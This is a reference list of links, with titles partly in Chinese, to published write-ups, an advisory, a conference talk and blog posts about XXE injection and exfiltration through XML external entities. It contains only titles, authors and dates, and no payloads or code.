- [excel-reader-xlsx #10](https://github.com/jmcnamara/excel-reader-xlsx/issues/10)
- [Midnight Sun CTF 2019 Quals - Rubenscube](https://jbz.team/midnightsunctfquals2019/Rubenscube)
- [SynAck - 深入 XXE 注入](https://www.synack.com/blog/a-deep-dive-into-xxe-injection/) - 2019年7月22日 - Trenton Gordon
- [Synacktiv - CVE-2019-8986: TIBCO JasperReports 服务器中的 SOAP XXE](https://www.synacktiv.com/ressources/advisories/TIBCO_JasperReports_Server_XXE.pdf) - 2019年3月11日 - Julien SZLAMOWICZ, Sebastien DUDEK
- [XXE: 如何成为绝地大师](https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yarbabin_XXE_Jedi_Babin.pdf) - Zeronights 2017 - Yaroslav Babin
- [针对 Cisco 和 Citrix 的有效载荷 - Arseniy Sharoglazov](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
- [在加固服务器上使用 XXE 进行数据泄露 - Ritik Singh - 2022年1月29日](https://infosecwriteups.com/data-exfiltration-using-xxe-on-a-hardened-server-ef3a3e5893ac)
